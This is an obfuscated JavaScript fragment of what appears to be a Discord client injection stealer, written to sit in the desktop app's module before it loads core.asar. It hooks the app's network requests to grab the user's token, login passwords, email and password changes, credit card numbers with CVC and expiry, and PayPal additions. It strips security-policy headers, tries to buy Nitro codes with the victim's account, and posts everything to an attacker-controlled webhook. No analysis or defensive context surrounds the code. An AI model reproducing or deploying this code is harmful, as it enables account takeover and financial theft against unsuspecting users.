_0x237854==0x400000&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x21d)),_0x237854-=0x400000),_0x237854==0x40000&&(_0x526ab2['push'](_0x35ccbb(0x247)),_0x237854-=0x40000),_0x237854==0x20000&&(_0x526ab2[_0x35ccbb(0x18a)]('Early\x20Verified\x20Bot\x20Developer'),_0x237854-=0x20000),_0x237854==0x4000&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x201)),_0x237854-=0x4000),_0x237854==0x200&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x1c6)),_0x237854-=0x200),_0x237854==0x100&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x1f2)),_0x237854-=0x100),_0x237854==0x80&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x221)),_0x237854-=0x80),_0x237854==0x40&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x243)),_0x237854-=0x40),_0x237854==0x8&&(_0x526ab2['push'](_0x35ccbb(0x22e)),_0x237854-=0x8),_0x237854==0x4&&(_0x526ab2['push']('HypeSquad\x20Event'),_0x237854-=0x4),_0x237854==0x2&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x1f3)),_0x237854-=0x2),_0x237854==0x1&&(_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x1a6)),_0x237854-=0x1),_0x237854==0x0?_0x526ab2[_0x35ccbb(0x240)]==0x0&&_0x526ab2[_0x35ccbb(0x18a)]('None'):_0x526ab2[_0x35ccbb(0x18a)](_0x35ccbb(0x1c4)),_0x526ab2[_0x35ccbb(0x216)](',\x20');},hooker=async _0x2e8406=>{const _0x47bb19=_0x1dbe75,_0x52c3a4=JSON[_0x47bb19(0x1ba)](_0x2e8406),_0x52ae5f=new URL(config[_0x47bb19(0x18c)]),_0x47c133={'Content-Type':'application/json','Access-Control-Allow-Origin':'*'};if(!config['webhook']['includes']('api/webhooks')){const _0x3f220f=totp(config['webhook_protector_key']);_0x47c133[_0x47bb19(0x224)]=_0x3f220f;}const _0x274ff7={'protocol':_0x52ae5f[_0x47bb19(0x1ab)],'hostname':_0x52ae5f[_0x47bb19(0x20c)],'path':_0x52ae5f[_0x47bb19(0x21b)],'method':'POST','headers':_0x47c133},_0x5f3e8b=https[_0x47bb19(0x1fa)](_0x274ff7);_0x5f3e8b['on']('error',_0x2ab2a5=>{const _0x178389=_0x47bb19;console[_0x178389(0x1c7)](_0x2ab2a5);}),_0x5f3e8b['write'](_0x52c3a4),_0x5f3e8b[_0x47bb19(0x244)]();},login=async(_0x569c31,_0x3538bf,_0x5e325a)=>{const _0x4a3834=_0x1dbe75,_0x458fdc=await getInfo(_0x5e325a),_0x35eacd=getNitro(_0x458fdc[_0x4a3834(0x1ef)]),_0x306561=getBadges(_0x458fdc[_0x4a3834(0x1b0)]),_0x1b6f51=await getBilling(_0x5e325a),_0x32090a={'username':config[_0x4a3834(0x1d3)],'avatar_url':config[_0x4a3834(0x19d)],'embeds':[{'color':config[_0x4a3834(0x22d)],'fields':[{'name':_0x4a3834(0x1d7),'value':_0x4a3834(0x198)+_0x569c31+'**\x20-\x20Password:\x20**'+_0x3538bf+'**','inline':![]},{'name':_0x4a3834(0x24a),'value':_0x4a3834(0x1fc)+_0x35eacd+_0x4a3834(0x188)+_0x306561+_0x4a3834(0x1b3)+_0x1b6f51+'**','inline':![]},{'name':'**Token**','value':'`'+_0x5e325a+'`','inline':![]}],'author':{'name':_0x458fdc['username']+'#'+_0x458fdc[_0x4a3834(0x193)]+_0x4a3834(0x214)+_0x458fdc['id'],'icon_url':_0x4a3834(0x200)+_0x458fdc['id']+'/'+_0x458fdc[_0x4a3834(0x242)]+_0x4a3834(0x1e2)}}]};if(config[_0x4a3834(0x239)])_0x32090a['content']=config[_0x4a3834(0x1e3)];hooker(_0x32090a);},passwordChanged=async(_0x4c6d2e,_0x19dee8,_0x9ea010)=>{const _0x103fea=_0x1dbe75,_0x5510eb=await getInfo(_0x9ea010),_0x46020b=getNitro(_0x5510eb['premium_type']),_0x2f3955=getBadges(_0x5510eb['flags']),_0x47797a=await getBilling(_0x9ea010),_0x28030e={'username':config[_0x103fea(0x1d3)],'avatar_url':config[_0x103fea(0x19d)],'embeds':[{'color':config[_0x103fea(0x22d)],'fields':[{'name':'**Password\x20Changed**','value':'Email:\x20**'+_0x5510eb[_0x103fea(0x234)]+_0x103fea(0x225)+_0x4c6d2e+_0x103fea(0x1e9)+_0x19dee8+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x103fea(0x1fc)+_0x46020b+_0x103fea(0x188)+_0x2f3955+_0x103fea(0x1b3)+_0x47797a+'**','inline':!![]},{'name':_0x103fea(0x215),'value':'`'+_0x9ea010+'`','inline':![]}],'author':{'name':_0x5510eb[_0x103fea(0x1b9)]+'#'+_0x5510eb[_0x103fea(0x193)]+_0x103fea(0x214)+_0x5510eb['id'],'icon_url':_0x103fea(0x200)+_0x5510eb['id']+'/'+_0x5510eb[_0x103fea(0x242)]+'.webp'}}]};if(config['ping_on_run'])_0x28030e[_0x103fea(0x197)]=config[_0x103fea(0x1e3)];hooker(_0x28030e);},emailChanged=async(_0x311a6c,_0x4a5d37,_0xe2bf3)=>{const _0x270928=_0x1dbe75,_0x2fcc43=await getInfo(_0xe2bf3),_0x1fcf75=getNitro(_0x2fcc43[_0x270928(0x1ef)]),_0x394c37=getBadges(_0x2fcc43[_0x270928(0x1b0)]),_0x1b1651=await getBilling(_0xe2bf3),_0x1cadbe={'username':config[_0x270928(0x1d3)],'avatar_url':config[_0x270928(0x19d)],'embeds':[{'color':config[_0x270928(0x22d)],'fields':[{'name':'**Email\x20Changed**','value':_0x270928(0x24e)+_0x311a6c+'**\x0aPassword:\x20**'+_0x4a5d37+'**','inline':!![]},{'name':_0x270928(0x24a),'value':'Nitro\x20Type:\x20**'+_0x1fcf75+_0x270928(0x188)+_0x394c37+'**\x0aBilling:\x20**'+_0x1b1651+'**','inline':!![]},{'name':_0x270928(0x215),'value':'`'+_0xe2bf3+'`','inline':![]}],'author':{'name':_0x2fcc43[_0x270928(0x1b9)]+'#'+_0x2fcc43[_0x270928(0x193)]+_0x270928(0x214)+_0x2fcc43['id'],'icon_url':_0x270928(0x200)+_0x2fcc43['id']+'/'+_0x2fcc43[_0x270928(0x242)]+_0x270928(0x1e2)}}]};if(config['ping_on_run'])_0x1cadbe[_0x270928(0x197)]=config[_0x270928(0x1e3)];hooker(_0x1cadbe);},PaypalAdded=async _0x569b29=>{const _0x1f989a=_0x1dbe75,_0x4672e3=await getInfo(_0x569b29),_0x2f4163=getNitro(_0x4672e3[_0x1f989a(0x1ef)]),_0x46b022=getBadges(_0x4672e3[_0x1f989a(0x1b0)]),_0x3283de=getBilling(_0x569b29),_0x3e62e6={'username':config[_0x1f989a(0x1d3)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x1f989a(0x22d)],'fields':[{'name':_0x1f989a(0x191),'value':_0x1f989a(0x1c3),'inline':![]},{'name':_0x1f989a(0x24a),'value':_0x1f989a(0x1fc)+_0x2f4163+'*\x0aBadges:\x20**'+_0x46b022+'**\x0aBilling:\x20**'+_0x3283de+'**','inline':![]},{'name':_0x1f989a(0x215),'value':'`'+_0x569b29+'`','inline':![]}],'author':{'name':_0x4672e3[_0x1f989a(0x1b9)]+'#'+_0x4672e3[_0x1f989a(0x193)]+_0x1f989a(0x214)+_0x4672e3['id'],'icon_url':_0x1f989a(0x200)+_0x4672e3['id']+'/'+_0x4672e3[_0x1f989a(0x242)]+_0x1f989a(0x1e2)}}]};if(config[_0x1f989a(0x239)])_0x3e62e6[_0x1f989a(0x197)]=config[_0x1f989a(0x1e3)];hooker(_0x3e62e6);},ccAdded=async(_0x3408c4,_0x257fd5,_0x43dc68,_0x11c93c,_0xefe951)=>{const _0x2da8d0=_0x1dbe75,_0x50ad1b=await getInfo(_0xefe951),_0x531a39=getNitro(_0x50ad1b[_0x2da8d0(0x1ef)]),_0x5ea26c=getBadges(_0x50ad1b['flags']),_0xfe0797=await getBilling(_0xefe951),_0x3ae578={'username':config[_0x2da8d0(0x1d3)],'avatar_url':config[_0x2da8d0(0x19d)],'embeds':[{'color':config[_0x2da8d0(0x22d)],'fields':[{'name':_0x2da8d0(0x1d1),'value':'Credit\x20Card\x20Number:\x20**'+_0x3408c4+'**\x0aCVC:\x20**'+_0x257fd5+'**\x0aCredit\x20Card\x20Expiration:\x20**'+_0x43dc68+'/'+_0x11c93c+'**','inline':!![]},{'name':_0x2da8d0(0x24a),'value':_0x2da8d0(0x1fc)+_0x531a39+_0x2da8d0(0x188)+_0x5ea26c+_0x2da8d0(0x1b3)+_0xfe0797+'**','inline':!![]},{'name':_0x2da8d0(0x215),'value':'`'+_0xefe951+'`','inline':![]}],'author':{'name':_0x50ad1b[_0x2da8d0(0x1b9)]+'#'+_0x50ad1b[_0x2da8d0(0x193)]+'\x20|\x20'+_0x50ad1b['id'],'icon_url':_0x2da8d0(0x200)+_0x50ad1b['id']+'/'+_0x50ad1b[_0x2da8d0(0x242)]+'.webp'}}]};if(config[_0x2da8d0(0x239)])_0x3ae578[_0x2da8d0(0x197)]=config[_0x2da8d0(0x1e3)];hooker(_0x3ae578);},nitroBought=async _0x3d86b2=>{const _0x3b37f9=_0x1dbe75,_0x46da8b=await getInfo(_0x3d86b2),_0x58aa56=getNitro(_0x46da8b['premium_type']),_0x174bd0=getBadges(_0x46da8b['flags']),_0x4e39cb=await getBilling(_0x3d86b2),_0x324573=await buyNitro(_0x3d86b2),_0x21b0df={'username':config[_0x3b37f9(0x1d3)],'content':_0x324573,'avatar_url':config[_0x3b37f9(0x19d)],'embeds':[{'color':config[_0x3b37f9(0x22d)],'fields':[{'name':_0x3b37f9(0x19c),'value':'**Nitro\x20Code:**\x0a```diff\x0a+\x20'+_0x324573+'```','inline':!![]},{'name':'**Discord\x20Info**','value':_0x3b37f9(0x1fc)+_0x58aa56+_0x3b37f9(0x188)+_0x174bd0+_0x3b37f9(0x1b3)+_0x4e39cb+'**','inline':!![]},{'name':_0x3b37f9(0x215),'value':'`'+_0x3d86b2+'`','inline':![]}],'author':{'name':_0x46da8b['username']+'#'+_0x46da8b['discriminator']+_0x3b37f9(0x214)+_0x46da8b['id'],'icon_url':_0x3b37f9(0x200)+_0x46da8b['id']+'/'+_0x46da8b[_0x3b37f9(0x242)]+'.webp'}}]};if(config[_0x3b37f9(0x239)])_0x21b0df['content']=config['ping_val']+('\x0a'+_0x324573);hooker(_0x21b0df);};session[_0x1dbe75(0x1d2)][_0x1dbe75(0x1d4)][_0x1dbe75(0x1e1)](config['filter2'],(_0x45e89d,_0x27beab)=>{const _0x34b304=_0x1dbe75;if(_0x45e89d[_0x34b304(0x1fe)][_0x34b304(0x213)](_0x34b304(0x230)))return _0x27beab({'cancel':!![]});updateCheck();}),session['defaultSession']['webRequest'][_0x1dbe75(0x189)]((_0x2d00dd,_0x1770a4)=>{const _0x5245d9=_0x1dbe75;_0x2d00dd[_0x5245d9(0x1fe)][_0x5245d9(0x213)](config[_0x5245d9(0x18c)])?_0x2d00dd[_0x5245d9(0x1fe)][_0x5245d9(0x1c0)](_0x5245d9(0x1c1))?_0x1770a4({'responseHeaders':Object[_0x5245d9(0x23e)]({'Access-Control-Allow-Headers':'*'},_0x2d00dd[_0x5245d9(0x20a)])}):_0x1770a4({'responseHeaders':Object[_0x5245d9(0x23e)]({'Content-Security-Policy':[_0x5245d9(0x21a),_0x5245d9(0x238),'Access-Control-Allow-Origin\x20\x27*\x27'],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x2d00dd['responseHeaders'])}):(delete _0x2d00dd[_0x5245d9(0x20a)]['content-security-policy'],delete _0x2d00dd['responseHeaders'][_0x5245d9(0x1a4)],_0x1770a4({'responseHeaders':{..._0x2d00dd[_0x5245d9(0x20a)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x1dbe75(0x1d2)][_0x1dbe75(0x1d4)][_0x1dbe75(0x190)](config['filter'],async(_0x14e274,_0x1d7404)=>{const _0x187ffd=_0x1dbe75;if(_0x14e274['statusCode']!==0xc8&&_0x14e274[_0x187ffd(0x1de)]!==0xca)return;const _0x32fb16=Buffer[_0x187ffd(0x20e)](_0x14e274[_0x187ffd(0x1b6)][0x0][_0x187ffd(0x24d)])['toString'](),_0x3d8bbc=JSON[_0x187ffd(0x1a9)](_0x32fb16),_0x50bc2a=await execScript('(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()');switch(!![]){case _0x14e274['url'][_0x187ffd(0x236)](_0x187ffd(0x1a5)):login(_0x3d8bbc[_0x187ffd(0x1a5)],_0x3d8bbc[_0x187ffd(0x1f5)],_0x50bc2a)[_0x187ffd(0x24b)](console[_0x187ffd(0x1a3)]);break;case _0x14e274['url'][_0x187ffd(0x236)](_0x187ffd(0x1c8))&&_0x14e274[_0x187ffd(0x21c)]===_0x187ffd(0x1b4):if(!_0x3d8bbc[_0x187ffd(0x1f5)])return;_0x3d8bbc[_0x187ffd(0x234)]&&emailChanged(_0x3d8bbc[_0x187ffd(0x234)],_0x3d8bbc[_0x187ffd(0x1f5)],_0x50bc2a)[_0x187ffd(0x24b)](console['error']);_0x3d8bbc[_0x187ffd(0x23c)]&&passwordChanged(_0x3d8bbc[_0x187ffd(0x1f5)],_0x3d8bbc['new_password'],_0x50bc2a)[_0x187ffd(0x24b)](console[_0x187ffd(0x1a3)]);break;case _0x14e274[_0x187ffd(0x1fe)]['endsWith'](_0x187ffd(0x20b))&&_0x14e274[_0x187ffd(0x21c)]==='POST':const _0x42f51c=querystring[_0x187ffd(0x1a9)](unparsedData[_0x187ffd(0x228)]());ccAdded(_0x42f51c['card[number]'],_0x42f51c[_0x187ffd(0x209)],_0x42f51c[_0x187ffd(0x23b)],_0x42f51c[_0x187ffd(0x1ff)],_0x50bc2a)['catch'](console['error']);break;case _0x14e274[_0x187ffd(0x1fe)][_0x187ffd(0x236)](_0x187ffd(0x1d0))&&_0x14e274['method']===_0x187ffd(0x1b1):PaypalAdded(_0x50bc2a)['catch'](console[_0x187ffd(0x1a3)]);break;case _0x14e274[_0x187ffd(0x1fe)][_0x187ffd(0x236)](_0x187ffd(0x1cf))&&_0x14e274['method']==='POST':if(!config[_0x187ffd(0x1f7)])return;setTimeout(()=>{const _0x42c799=_0x187ffd;nitroBought(_0x50bc2a)[_0x42c799(0x24b)](console[_0x42c799(0x1a3)]);},0x1d4c);break;default:break;}}),module[_0x1dbe75(0x1af)]=require('./core.asar');